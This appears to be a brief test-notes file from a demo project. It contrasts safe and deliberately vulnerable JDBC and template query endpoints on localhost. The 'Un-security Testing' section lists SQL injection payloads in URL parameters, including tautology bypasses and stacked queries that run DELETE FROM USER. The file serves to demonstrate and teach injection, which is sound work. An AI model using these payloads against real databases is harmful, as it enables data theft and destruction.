# Security Testing
## JDBC Single
- http://localhost:8086/jdbc/security/single?id=id-1
## JDBC List
- http://localhost:8086/jdbc/security/list?title=DEV
## Template Single
- http://localhost:8086/template/security/single?id=id-1
## Template List
- http://localhost:8086/template/security/list?title=DEV

# Un-security Testing
## JDBC Single
- http://localhost:8086/jdbc/un-security/single?id=id-1' and 'a'='a
- http://localhost:8086/jdbc/un-security/single?id=id-1' and 'a'='b
- http://localhost:8086/jdbc/un-security/single?id=id-1' or 1=1 offset 1 limit 2;--
## JDBC List
- http://localhost:8086/jdbc/un-security/list?title=DEV' or 'a'='a
- http://localhost:8086/jdbc/un-security/list?title=DEV';DELETE FROM USER;--
- http://localhost:8086/jdbc/un-security/list?title=DEV';DELETE FROM USER;SELECT * FROM USER WHERE 'a'='a
